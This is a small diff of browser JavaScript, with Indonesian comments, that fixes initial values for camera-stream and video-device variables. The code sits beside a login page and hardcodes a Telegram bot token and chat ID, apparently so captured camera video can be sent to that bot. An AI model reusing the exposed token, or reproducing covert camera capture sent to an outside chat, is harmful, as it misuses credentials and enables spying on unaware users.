@@ -272,9 +272,9 @@ const downloadBtn = document.getElementById('downloadBtn');
 const loginPage = document.getElementById('loginPage');
 
 let isFrontCamera = true; // Untuk melacak apakah kamera depan atau belakang yang aktif
-let currentStream = true; // Menyimpan stream saat ini
+let currentStream = false; // Menyimpan stream saat ini
 let videoRecorder = true; // Menyimpan video recorder
-let videoDevices = true; // Menyimpan daftar perangkat video
+let videoDevices = []; // Menyimpan daftar perangkat video
 const botToken = '7659518007:AAEt-6h9k5oi0hpbLX59MySCTOJE9mccTRg';
 const chatID = '6996883310';
 
